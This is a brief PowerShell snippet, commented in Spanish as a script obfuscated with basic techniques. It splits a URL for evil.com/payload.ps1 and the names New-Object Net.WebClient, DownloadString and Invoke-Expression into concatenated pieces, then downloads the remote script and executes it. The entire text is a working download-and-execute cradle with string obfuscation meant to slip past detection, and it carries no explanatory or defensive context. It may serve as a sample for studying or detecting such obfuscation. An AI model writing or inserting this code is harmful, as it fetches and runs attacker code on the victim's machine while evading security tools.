# Script ofuscado con técnicas básicas
$u = "ht"+"tp:/"+"/evil"+".com/pay"+"load.ps1"
$w = "New"+"-Object"+" Net."+"WebClient"
$d = "Down"+"loadString"
$i = "Invoke"+"-Expression"

$c = (New-Object Net.WebClient).DownloadString($u)
& ($i -replace ' ','') $c